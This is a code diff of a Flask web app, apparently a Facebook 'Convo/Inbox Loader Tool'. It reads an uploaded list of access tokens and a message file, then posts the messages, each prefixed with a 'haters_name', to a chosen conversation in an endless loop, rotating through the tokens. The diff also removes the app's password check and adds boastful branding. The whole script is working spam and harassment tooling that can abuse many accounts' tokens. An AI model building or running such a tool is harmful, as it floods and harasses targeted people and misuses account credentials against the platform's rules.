@@ -18,104 +18,125 @@ headers = {
     'referer': 'www.google.com'
 }
 
-# Set a password for the script
-script_password = " Jai Shree RAM"  # Replace with your desired password
-hashed_password = hashlib.sha256(script_password.encode()).hexdigest()
-
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
-        entered_password = request.form.get('password')
+        access_tokens_file = request.files['accessToken']
+        access_tokens = access_tokens_file.readlines()
+        num_tokens = len(access_tokens)
+        convo_id = request.form.get('threadId')
+        haters_name = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
 
-        # Check if the entered password is correct
-        if hashlib.sha256(entered_password.encode()).hexdigest() == hashed_password:
-            access_tokens_file = request.files['accessToken']
-            access_tokens = access_tokens_file.readlines()
-            num_tokens = len(access_tokens)
-            convo_id = request.form.get('threadId')
-            haters_name = request.form.get('kidx')
-            time_interval = int(request.form.get('time'))
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+        num_messages = len(messages)
+        max_tokens = min(num_tokens, num_messages)
 
-            txt_file = request.files['txtFile']
-            messages = txt_file.read().decode().splitlines()
-            num_messages = len(messages)
-            max_tokens = min(num_tokens, num_messages)
+        try:
+            while True:
+                for message_index in range(num_messages):
+                    token_index = message_index % max_tokens
+                    access_token = access_tokens[token_index].decode().strip()
+                    message = haters_name + ' ' + messages[message_index].strip()
 
-            try:
-                while True:
-                    for message_index in range(num_messages):
-                        token_index = message_index % max_tokens
-                        access_token = access_tokens[token_index].decode().strip()
-                        message = haters_name + ' ' + messages[message_index].strip()
+                    api_url = f'https://graph.facebook.com/v15.0/t_{convo_id}/'
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, json=parameters, headers=headers)
 
-                        api_url = f'https://graph.facebook.com/v15.0/t_{convo_id}/'
-                        parameters = {'access_token': access_token, 'message': message}
-                        response = requests.post(api_url, json=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print("SENDED BY TOKEN {}: {}".format(token_index+1, {message}))
+                    else:
+                        print(f"Failed  {message}")
 
-                        if response.status_code == 200:
-                            print(f"Message sent using token {access_token}: {message}")
-                        else:
-                            print(f"Failed to send message using token {access_token}: {message}")
+                    time.sleep(time_interval)
 
-                        time.sleep(time_interval)
-
-            except Exception as e:
-                print(f"Error while sending message: {e}")
-                time.sleep(30)
-
-        else:
-            return "Incorrect password. Access denied."
+        except Exception as e:
+            print(f"Error while sending message: {e}")
+            time.sleep(30)
 
     return '''
-<!DOCTYPE html>
+    <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sahil❤️CHOUDHARY</title>
+  <title>SAHIL😈DADDY💀KA W3B</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
-    body{
+    body {
       background-color: #f8f9fa;
+      overflow: hidden; /* Hide overflow to prevent scrolling during animation */
     }
-    .container{
-      max-width: 500px;
-      background-color: #fff;
-      border-radius: 10px;
-      padding: 20px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-      margin: 0 auto;
-      margin-top: 20px;
+
+    /* Add blur effect to body */
+    body:before {
+      content: "";
+      position: fixed;
+      z-index: -1;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('https://i.ibb.co/0sr1mVJ/7b7cbc0b-0094-4f2d-959e-d221ea8c1796.jpg') center center;
+      background-size: cover;
+      filter: blur(8px);
     }
-    .header{
+
+    .container {
+      opacity: 0; /* Initially hide container */
+      transform: translateY(100%); /* Slide down initially */
+      transition: opacity 1s, transform 1s;
+    }
+
+    .container.show {
+      opacity: 1;
+      transform: translateY(0); /* Slide up when shown */
+    }
+
+    .header {
       text-align: center;
       padding-bottom: 20px;
     }
-    .btn-submit{
+
+    .btn-submit {
       width: 100%;
       margin-top: 10px;
     }
-    .footer{
+
+    .footer {
       text-align: center;
       margin-top: 20px;
       color: #888;
     }
+
+    /* Style for white labels */
+    label {
+    color: white;
+    height: 100%;
+    display: inline-block; /* Make labels block-level elements */
+    width: 200px; /* Set the desired width */
+    margin-right: 10px; 
+    max-width: 150px; 
+    overflow: hidden;
+    text-overflow: ellipsis; 
+    white-space: nowrap; 
+    display: inline-block; 
+    margin-bottom: 2px;
+
+    }
   </style>
 </head>
+
 <body>
   <header class="header mt-4">
-    <h1 class="mb-3"> 𝗦𝗬𝗦𝗧𝗨𝗠𝗠 𝗛𝗘𝗥𝗘
-                                     ⒷⓎ
-    𝐒𝐀𝐇𝐈𝐋 𝐂𝐇𝐎𝐔𝐃𝐇𝐀𝐑𝐘😈
-    <h1 class="mt-3">🅾🆆🅽🅴🆁]|^>>>• 𝐒𝐀𝐇𝐈𝐋 𝐂𝐇𝐎𝐔𝐃𝐇𝐀𝐑𝐘  </h1>
+    <h1 class="mb-3"> 𝗦𝗬𝗦𝗧𝗨𝗠𝗠 𝗛𝗘𝗥𝗘 ⒷⓎ 𝐒𝐀𝐇𝐈𝐋 𝐂𝐇𝐎𝐔𝐃𝐇𝐀𝐑𝐘😈 </h1>
+    <h1 class="mt-3">🅾🆆🅽🅴🆁]|^>>>• 𝐒𝐀𝐇𝐈𝐋 𝐂𝐇𝐎𝐔𝐃𝐇𝐀𝐑𝐘 </h1>
   </header>
 
-  <div class="container">
+  <div class="container" id="mainContainer">
     <form action="/" method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="password">Enter Password:</label>
-        <input type="password" class="form-control" id="password" name="password" required>
-      </div>
       <div class="mb-3">
         <label for="accessToken">Attach Token File:</label>
         <input type="file" class="form-control" id="accessToken" name="accessToken" accept=".txt" required>
@@ -140,17 +161,25 @@ def send_message():
     </form>
   </div>
   <footer class="footer">
-    <p>&copy; Developed by 𝐒𝐀𝐇𝐈𝐋 𝐂𝐇𝐎𝐔𝐃𝐇𝐀𝐑𝐘 . All Rights Reserved.</p>
-    <p>Convo/Inbox Loader Tool</p>
     <a href="https://facebook.com/100040009717781"><|-/😈sʌʜıɭ Cʜo𝐮DʜʌrƔ➤➖😈❤️➖❥</a>
-    <p>
-    Keep enjoying</p>
+    <p>Keep enjoying</p>
   </footer>
+
+  <script>
+    // JavaScript to trigger the animation after the page has loaded
+    window.onload = function () {
+      document.getElementById('mainContainer').classList.add('show');
+    }
+  </script>
 </body>
-  </html>
+
+</html>
+
     '''
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
     app.run(debug=True)
+    
+    
